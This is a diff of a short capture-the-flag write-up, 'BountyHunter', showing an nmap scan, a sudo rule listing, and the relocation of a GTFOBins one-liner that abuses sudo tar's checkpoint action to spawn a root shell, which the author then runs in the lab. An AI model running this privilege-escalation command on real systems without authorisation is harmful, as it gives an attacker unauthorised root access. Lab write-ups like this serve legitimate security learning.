@@ -1,8 +1,5 @@
 # BountyHunter
 
-``sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
-``
-
 ```
 t3nsh0@KALI:~/htb/smag$ sudo nmap 10.10.146.130 -sC -sV
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-31 21:11 CEST
@@ -83,8 +80,10 @@ User lin may run the following commands on bountyhacker:
 ``` 
 <br>
 There is a privesc with it on gtfobins so it's an easy win <br>
+
 ``sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
 ``
+
 <br>
 Let's run it :<br>
 ```lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
